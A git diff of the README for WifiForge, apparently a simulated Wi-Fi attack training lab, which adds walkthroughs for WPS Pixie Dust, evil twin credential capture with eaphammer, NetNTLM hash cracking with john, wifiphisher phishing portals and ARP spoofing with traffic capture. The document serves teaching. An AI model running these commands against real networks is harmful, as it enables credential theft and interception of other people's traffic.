@@ -113,7 +113,7 @@ After a little while, aircrack will crack the password.
 *THIS COMPLETES THE LAB*
 
 # WEP 
-To begin the WPA 2 lab, select it from the menu; the following should appear on your screen:
+To begin the WEP lab, select it from the menu; the following should appear on your screen:
 ![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/3955aeac-1bbf-4c0a-adf6-86f1adfc923d)
 
 The network of this lab consists of an attacker machine "a," from which we will launch our attacks from, and our victim machines. 
@@ -212,15 +212,22 @@ Aircrack will quickly crack the key using the data obtained from the network cap
 
 # WPS Pixie Dust Attack
 
-To begin the WPA 2 lab, select it from the menu; the following should appear on your screen:
+***Note: if wifite fails to detect the network, exit the lab and close all xterm windows before restarting***
+
+To begin the WPS lab, select it from the menu; the following should appear on your screen:
 ![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/a3757ea5-4912-42d4-9198-a1f4da094c3c)
 
 The network of this lab consists of an attacker machine "a," from which we will launch our attacks from, and our victim machine. 
-Open an xterm session on your attacker machine.
+If an xterm session doesn't automatically open, run the following command to open one:
 ```
 xterm a
 ```
 ![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/5530e622-ba36-41e8-afd8-6dc0ba0195e3)
+
+Wi-Fi protected setup is a feature on some routers that allows a user to connect to an AP without manually entering the network key within a certain timeframe of pushing the WPS button. 
+While this feature is convienent for quickly connecting to a network, it also comes with vulnerabilities that easily allow an attacker into the network. 
+
+To demonstrate, we will use wifite.
 
 Now run wifite -wps, it may take a while to locate the network. 
 ![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/3a1330f5-45a7-4291-b1ce-9f06727f6af7)
@@ -230,10 +237,193 @@ When the network has been located (ESSID secure_wifi in this case) press Ctrl + 
 A prompt will appear requesting specification on which network to use. Only one network should be present; input 1 to select it. 
 ![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/f87718a5-6827-46ac-b259-d14dcb3a439b)
 
+wifite will attempt a series of WPS attacks and eventually reveal the pin. 
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/10f011e3-dc9a-4a60-a031-a6470e53f8d5)
 
+*THIS COMPLETES THE LAB*
 
 # Evil Twin Attack
 
+To begin the Evil Twin lab, select it from the menu; the following should appear on your screen: 
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/62db1ed9-f7ac-428e-a02f-971c568d984d)
+
+The network of this lab consists of an attacker machine "a," from which we will launch our attacks from, and our victim machine. 
+Run the following command within the mininet-wifi CLI to start an xterm session on the attacker machine.
+```
+xterm a
+```
+
+Within the xterm session, cd into the framework directory and run eaphammer:
+```
+./eaphammer -e CORP-SECURE --creds --interface a-wlan0
+```
+- eaphammer is a toolkit for performing targeted evil twin attacks against WPA2-Enterprise networks.
+- -e CORP-SECURE specifies the essid to imitate. In this case, the network is CORP-SECURE
+- --creds specifies that we want to capture credentials
+- --interface a-wlan0 specifies the interface to launch the attack from
+
+Note that in the current state of WifiForge, eaphammer and its output are simulated due to the limitations of the environment.
+
+Running the command should provide the following output: 
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/812a125f-9fbb-4aa0-9bd3-f313bf084666)
+
+Successful initialization is indicated by the following: 
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/8ad85a5b-7867-4f79-a782-7cdb101d4071)
+
+If the tool works correctly, the following information should appear at the bottom of the output after a length of time. 
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/22aebb4e-229c-4f21-8b7f-0cd1e479f3f4)
+
+This output indicates that a host connected to our evil twin, from which eaphammer collected the victim's hashes. 
+A hash is a computation designed to scramble something into something else **less decipherable.* Eaphammer provides two 
+hashes, one for hashcat and another for jtr (john the ripper). A copy of these hashes are saved in the Framework/loot directory. 
+
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/a4d25b82-285d-4db3-a231-8e4050138711)
+
+After obtaining the hashes, it's time to attempt to crack them using john the ripper. 
+John can crack hashes using a wordlist or a mask. Cracking a password from a mask allows us to guess a password from some information we might already know. 
+For example, in this scenario, say know that a commonly used password in our target network is Badpass[some number], 
+we can then use john to guess other users’ passwords with the following commands:
+```
+Echo 'johnnie.doyle@lab.local$NETNTLM$65c09d9d0f121f7d$5eb76975d83fee344ededca6fb86e8b04fde87c3cde150ff' > johnnie.hash 
+
+john --format=netntlm johnnie.hash --mask='Badpass?d' --min-length=7 --max-length=13 --pot=/opt/wifilabs/johnnie.pot 
+```
+
+If successful, the password will appear in gold as in the screenshot below: 
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/8afc79ac-09ec-4c16-9353-f96e7280e511)
+
+*THIS COMPLETES THE LAB*
+
 # Wifiphisher 
 
+To begin the Wifiphisher lab, select it from the menu; the following should appear on your screen:
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/927db2e9-31e2-42dd-8611-8b01b6610e38)
+
+
+The network of this lab consists of an attacker machine "a," from which we will launch our attacks from, and our victim machine. 
+Start an xterm session on both the attacker and host machines using the following command: 
+```
+xterm a host1
+```
+Within the xterm terminal, use the command "ip a" to view the IPs of the interfaces:
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/a6b34730-5115-4e44-a9cf-11d987657db3)
+
+Type wifiphisher -h to view the help menu
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/0bacbfe2-4100-425d-b2f7-1d3b18dab615)
+
+The next command will use wifiphisher to create a lookalike corporate network to entice wireless client connections.
+Once connected, the wifi_connect template will reidrect all requests to a phishing page. The phishing page is
+designed to look like a Windows wireless network connection manager. 
+```
+Wifiphisher –e CORP-RETAIL –p wifi_connect –kB
+```
+- -e CORP-RETAIL specifies the ESSID we want to immitate
+- -p wifi_connect specifies the attack we want to use
+- -kB tells wifiphisher to advertise a list of ESSIDs
+
+The following should appear on your screen after running the command: 
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/219cbb89-9b24-4c3d-865b-ed0eef5104bd)
+
+After a few seconds, the following screen, called the operator's console, should appear. 
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/889c01d0-a5de-405b-8b64-8a10ddb89496)
+
+The goal of this attack aims to trick a device into connecting to one of these fake networks, 
+either because a user believes the network to be legitimate, or because the machine itself believes
+the network is one it's connected to before and automatically connects to it. 
+
+Switch over to host1 and play the part of the victim using the following command: 
+```
+iwlist host1-wlan0 scan
+```
+A handful of networks should appear. All of these networks are fake networks generated by eaphammer. 
+If you run the command again, you might find the list has changed or that more networks have shown up.
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/93d7fcb9-5aa9-4174-9e1d-04e7b984d44b)
+
+You should also see the ESSID we specified in the wifiphisher command
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/287db902-f0b3-4330-bfb6-ebacebf61742)
+
+Simulate a victim connecting to this network using the following command: 
+```
+iwconfig host1-wlan0 essid CORP-RETAIL
+```
+
+The following output should appear on the operator's console upon a successful connection
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/7b72f013-baae-482c-a087-64f1b834ac82)
+
+Within host1, use the browser script in the framework directory to start a chrome browser with a windows user agent
+```
+./browser windows
+```
+A chrome browser should appear, type 10.0.0.1 (or the IP of the wifiphisher interface) to access the captive portal
+that would normally automatically appear when a victim connects. Note how the landing page looks like a windows OS
+network login tab. However, it's all fake! 
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/7ab9812f-fc41-4709-bf6e-eb1368eb9ecb)
+
+Input a password (don't use your real passwords, of course!) and check the operator's console:
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/208d0c55-179c-4d3b-b08e-489508a39e7a)
+
+Wifiphisher uses a different landing page for Linux and iOS clients. 
+To view this landing page, close chrome, and start a new session with the following command:
+```
+./browser linux
+```
+
+Navigating to 10.0.0.1 (or the IP of the wifiphisher interface) provides a landing page with a different look.
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/0699e602-7494-4fa4-b814-482ac607e0f9)
+
+*THIS COMPLETES THE LAB*
+
 # ARPspoof 
+
+To begin the ARPspoof lab, select it from the menu; the following should appear on your screen:
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/927db2e9-31e2-42dd-8611-8b01b6610e38)
+
+
+The network of this lab consists of an attacker machine "a," from which we will launch our attacks from, and our victim machine. 
+Start two xterm sessions on the attacker machine and one on the victim using the following command: 
+```
+xterm a a host1
+```
+
+From host1's xterm session, ping google.com.
+```
+ping -c1 google.com
+```
+Check host1's ARP table
+```
+arp -a
+```
+
+The entry in the ARP table corresponds to the network's router
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/8f0f14d8-4037-4dbf-bc4f-028e9a730b73)
+
+ARPspoof is a tool that allows us to trick a victim into routing its traffic through us before the router. 
+Run the following command on the attacking machine: 
+```
+arpspoof -i a-wlan0 -t 10.0.0.2 -r 10.0.0.4
+```
+- -i a-wlan0 specifies the interface the launch the attack from
+- -t 10.0.0.2 specifies the IP of the victim (in this case host1)
+- -r 10.0.0.4 specifies the target network's AP (check the IP of the router by typing "ip a" in an ap1 xterm session)
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/4be28ece-bd5d-4b6a-8798-0b70c51327b1)
+
+
+On host1, check the ARP table again
+```
+arp -a
+```
+Notice that the IP of our attacker machine now shows up in the arp table.  
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/f1e26857-5a05-4582-8ca6-509cfa69514c)
+
+We can now observe the network traffic coming and going to host1 from our attacking machine. 
+On the attacking machine, run 
+```
+tcpdump -i a-wlano
+```
+- tcpdump is a traffic analysis tool that displays the traffic coming and going from an interface
+- -i a-wlan0 specifies that tcpdump should use the interface that has host1's traffic running through it
+
+on host1, ping google.com again and observe the tcpdump on the attacker machine.
+![image](https://github.com/her3ticAVI/Wifi-Forge/assets/95513994/5deb6f77-3853-4452-b1d4-1ffb6d861c21)
+
+*THIS COMPLETES THE LAB*
